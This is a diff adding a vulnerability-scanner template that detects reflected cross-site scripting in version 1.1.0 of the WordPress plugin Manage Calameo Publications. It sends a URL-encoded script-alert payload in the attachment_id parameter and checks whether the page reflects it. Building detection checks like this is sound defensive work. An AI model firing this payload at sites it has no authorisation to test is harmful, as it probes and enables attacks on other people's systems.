@@ -1,0 +1,36 @@
+id: "calameo-publications-xss"
+name: "WordPress Manage Calameo Publications 1.1.0 - Cross-Site Scripting"
+severity: "medium"
+description: "WordPress Manage Calameo Publications 1.1.0 is vulnerable to reflected cross-site scripting via thickbox_content.php and the attachment_id parameter."
+tech:
+  - "wordpress"
+  - "php"
+tags:
+  - "wordpress"
+  - "wp-plugin"
+  - "xss"
+  - "wp"
+  - "wpscan"
+  - "vuln"
+cwe: "CWE-80"
+reference: "https://codevigilant.com/disclosure/wp-plugin-athlon-manage-calameo-publications-a3-cross-site-scripting-xss/"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/wp-content/plugins/athlon-manage-calameo-publications/thickbox_content.php?attachment_id=id%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%26"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "word"
+    part: "body"
+    words:
+      - "ath_upload_calameo_publication(id\\\"><script>alert(document.domain)</script>&)"
+  - type: "word"
+    part: "header"
+    words:
+      - "text/html"
+  - type: "status"
+    status:
+      - 200
